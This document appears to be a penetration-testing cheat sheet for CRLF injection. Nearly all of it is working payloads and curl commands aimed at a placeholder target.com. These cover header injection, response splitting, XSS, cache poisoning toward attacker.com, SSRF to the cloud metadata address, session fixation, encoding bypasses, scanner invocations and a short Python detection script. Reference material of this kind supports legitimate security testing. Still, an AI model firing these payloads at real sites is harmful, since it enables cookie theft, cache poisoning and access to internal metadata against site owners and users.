#### 1. BASIC DETECTION
# HTTP Header Injection
curl -i "http://target.com/search?q=test%0d%0aInjected-Header:%20hacked"
curl "http://target.com/redirect?url=http://evil.com%0d%0aX-Forwarded-For:%20127.0.0.1"

# Log Poisoning
curl "http://target.com/login?user=%0d%0aadmin%20[SUCCESS]%20Login"

# Response Splitting
curl -v "http://target.com/set-cookie?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a..."

#### 2. AUTOMATED TOOLS
# CRLFuzz (Fast scanner)
crlfuzz -u "http://target.com/search?query=FUZZ" -w crlf-payloads.txt

# Burp Suite Active Scan
# Use "CRLF injection" scan checks

# Nuclei Templates
nuclei -t templates/vulnerabilities/crlf/ -u http://target.com

#### 3. EXPLOITATION TECHNIQUES
# XSS via HTTP Headers
http://target.com/?search=test%0d%0aX-XSS-Protection:%200%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>

# Cache Poisoning
http://target.com/%0d%0aX-Cache-Key:%20evil-key%0d%0aX-Forwarded-Host:%20attacker.com

# HTTP Request Smuggling Prep
GET /%0d%0aHost:%20internal-api%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com HTTP/1.1

#### 4. BYPASS TECHNIQUES
# Double Encoding
%250d%250aInjected-Header:%20test

# Unicode Line Separators
%E2%80%A8X-Forwarded-For: 127.0.0.1

# Tab Characters
%09X-Injected:%20true

#### 5. CHAINING ATTACKS
# Web Cache Deception
http://target.com/profile%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>stealCookies()</script>

# SSRF via Host Header
http://target.com/%0d%0aHost:%20169.254.169.254%0d%0a%0d%0aGET%20/latest/meta-data%20HTTP/1.1

#### 6. POST-EXPLOITATION
# Session Fixation
Set-Cookie: sessionid=attacker_session%0d%0aSet-Cookie:%20httponly;%20secure

# Security Control Bypass
X-Forwarded-For:%20127.0.0.1%0d%0aX-Real-IP:%20127.0.0.1

#### 7. BLIND DETECTION
# Timing Attacks
time curl -v "http://target.com/?test=%0d%0aX-Delay:%205" > /dev/null

# DNS Exfiltration
curl "http://target.com/log?msg=%0d%0aLocation:%20http://unique.attacker.com"

#### PRO TIPS:
# 1. Always test:
#  - URL parameters
#  - Redirect endpoints
#  - Header manipulation points
#  - Log injection vectors

# 2. Critical targets:
#  - HTTP headers (Location, Set-Cookie)
#  - Logging systems
#  - Email headers
#  - Proxy servers

# 3. Escalation paths:
#  - XSS via header injection
#  - Cache poisoning
#  - Session fixation
#  - Security control bypass

#### RECOMMENDED PAYLOADS:
#  - %0d%0aInjected-Header: test
#  - %23%0d%0aHTTP/1.1%20200%20OK%0d%0a...
#  - %3f%0d%0aX-Forwarded-For: 127.0.0.1
#  - %E2%80%A8X-Injected: true (Unicode line separator)

# SECURITY IMPACT:
# - Successful CRLF injection may lead to:
# - HTTP header injection
# - Cross-site scripting (XSS)
# - Web cache poisoning
# - Security control bypass
# - Log forging
# - HTTP request smuggling

#### SAMPLE DETECTION SCRIPT:
```python
# crlf_detector.py
import requests

def check_crlf(url):
    payloads = [
        "%0d%0aX-Injected: test",
        "%23%0d%0aX-Injected: test",
        "%E2%80%A8X-Injected: test"  # Unicode line separator
    ]
    
    for payload in payloads:
        r = requests.get(f"{url}{payload}", allow_redirects=False)
        if "X-Injected" in str(r.headers):
            print(f"Vulnerable to CRLF via: {payload}")
            return True
    print("No CRLF injection detected")
    return False

check_crlf("http://target.com/search?q=")
```